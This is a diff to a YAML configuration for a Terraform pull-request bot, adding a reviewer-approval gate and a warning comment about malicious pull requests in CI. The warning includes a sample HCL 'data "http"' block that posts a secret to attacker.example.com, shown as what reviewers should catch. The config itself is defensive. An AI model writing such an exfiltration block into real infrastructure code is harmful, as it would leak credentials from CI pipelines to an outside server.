@@ -1,6 +1,7 @@
 workspaces:
   - organization: jgiannuzzi
     name: tf
+    comment: lgtm
     policy:
       approval:
         - lgtm
@@ -20,3 +21,18 @@ approval_rules:
       count: 1
       teams:
         - "jgiannuzzi-org/tf-approvers"
+
+comments:
+  - name: lgtm
+    content: |
+      Hi there!
+      
+      No speculative plan will be run for this PR until someone from @jgiannuzzi-org/tf-approvers checks the changes.
+      You will need to look for anything suspicious that would allow extracting secrets, like using a different address for a provider, or even posting a secret directly to an attacker-controlled server. Here is an example:
+      ```hcl
+      data "http" "leak_my_secrets" {
+        url = https://attacker.example.com/collect?secret=${urlencode(null_resource.leak_my_secrets.triggers.secret)}"
+      }
+      ```
+
+      If you're happy with the changes, you can comment "LGTM" and I will run a speculative plan for you. If you see anything weird, please comment "👎" and I will block speculative plans from running for this PR.
